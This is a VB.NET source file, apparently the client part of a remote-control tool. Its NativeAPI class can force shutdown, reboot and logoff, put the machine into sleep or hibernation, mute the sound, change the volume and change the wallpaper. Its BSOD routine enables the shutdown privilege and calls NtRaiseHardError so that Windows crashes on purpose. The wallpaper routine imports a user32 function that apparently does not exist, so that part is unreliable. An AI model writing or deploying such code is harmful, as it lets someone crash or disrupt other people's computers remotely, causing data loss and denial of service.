Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class NativeAPI
    Public Shared Sub PowerOptions(ByVal flg As Integer, Optional ByVal minRea As Integer = 0)
        Dim t1 As Boolean


        RtlAdjustPrivilege(19, True, False, t1)
        ExitWindowsEx(flg, 0 Or minRea)
    End Sub

    Public Shared Sub BSOD()
        Dim t1 As Boolean
        Dim t2 As UInteger
        RtlAdjustPrivilege(19, True, False, t1)
        NtRaiseHardError(i, 0, 0, IntPtr.Zero, 6, t2)
    End Sub
    Public Shared Sub HIBSUSPEND(ByVal B As Boolean)
        Dim t1 As Boolean
        NativeAPI.RtlAdjustPrivilege(19, True, False, t1)

        NativeAPI.SetSuspendState(B, True, True)
        '    SetSystemPowerState(B, True)
    End Sub

    ''Not set yet because of problem with openfiledialog server-side
    Public Shared Async Sub SetWallPaper(ByVal Data As Object())
        Try
            Await Task.Run(Sub() IO.File.WriteAllBytes(IO.Path.GetTempPath & "\" & Data(1), Data(2)))
            NativeAPI.SetDeskWallpaper(IO.Path.GetTempPath & "\" & Data(1))
        Catch ex As Exception

        End Try

    End Sub
    Public Class AppCommand

        Private Const APPCOMMAND_VOLUME_MUTE As Integer = &H80000
        Private Const APPCOMMAND_VOLUME_UP As Integer = &HA0000
        Private Const APPCOMMAND_VOLUME_DOWN As Integer = &H90000
        Private Const WM_APPCOMMAND As Integer = &H319

        <DllImport("user32.dll")>
        Private Shared Function SendMessageW(ByVal hWnd As IntPtr,
        ByVal Msg As Integer, ByVal wParam As IntPtr,
        ByVal lParam As IntPtr) As IntPtr

        End Function

        Private Shared fwHandle As New Form

        Public Shared Sub Mute_Sound()
            SendMessageW(fwHandle.Handle, WM_APPCOMMAND, fwHandle.Handle, APPCOMMAND_VOLUME_MUTE)
        End Sub


        Public Shared Sub VolDown()

            SendMessageW(fwHandle.Handle, WM_APPCOMMAND, fwHandle.Handle, APPCOMMAND_VOLUME_DOWN)
        End Sub

        Public Shared Sub VolUp()
            SendMessageW(fwHandle.Handle, WM_APPCOMMAND, fwHandle.Handle, APPCOMMAND_VOLUME_UP)
        End Sub


    End Class

    Private Const i = &HC0000022  ''error code

    <DllImport("user32.dll", ExactSpelling:=True, SetLastError:=True)>
    Private Shared Function ExitWindowsEx(ByVal flg As Integer, ByVal rea As Integer) As Boolean

    End Function


    Friend Const EWX_LOGOFF As Integer = &H0
    Friend Const EWX_SHUTDOWN As Integer = &H1
    Friend Const EWX_REBOOT As Integer = &H2
    Friend Const EWX_FORCE As Integer = &H4
    Friend Const EWX_POWEROFF As Integer = &H8
    Friend Const EWX_FORCEIFHUNG As Integer = &H10

    Friend Const SHTDN_REASON_MINOR_BLUESCREEN = &HF
    Friend Const SHTDN_REASON_MAJOR_SOFTWARE = &H30000

    <DllImport("ntdll.dll")>
    Private Shared Function RtlAdjustPrivilege(ByVal Privilege As Integer, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, <Out> ByRef PreviousValue As Boolean) As UInteger

    End Function

    <DllImport("ntdll.dll")>
    Private Shared Function NtRaiseHardError(ByVal ErrorStatus As Integer, ByVal NumberOfParameters As UInteger, ByVal UnicodeStringParameterMask As UInteger, ByVal Parameters As IntPtr, ByVal ValidResponseOption As UInteger, <Out> ByRef Response As UInteger) As UInteger

    End Function
    <DllImport("user32.dll")>
    Private Shared Function SetDeskWallpaper(ByVal FileName As String) As Long

    End Function

    ''Those 2 functions are equivalent
    <DllImport("PowrProf.dll", ExactSpelling:=True, SetLastError:=True)>
    Private Shared Function SetSuspendState(ByVal bHibernate As Boolean, ByVal bForce As Boolean, ByVal bWakeupEventsDisabled As Boolean) As Boolean

    End Function
    <DllImport("kernel32.dll")>
    Private Shared Function SetSystemPowerState(ByVal fSuspend As Boolean, ByVal fForce As Boolean) As Boolean

    End Function
End Class
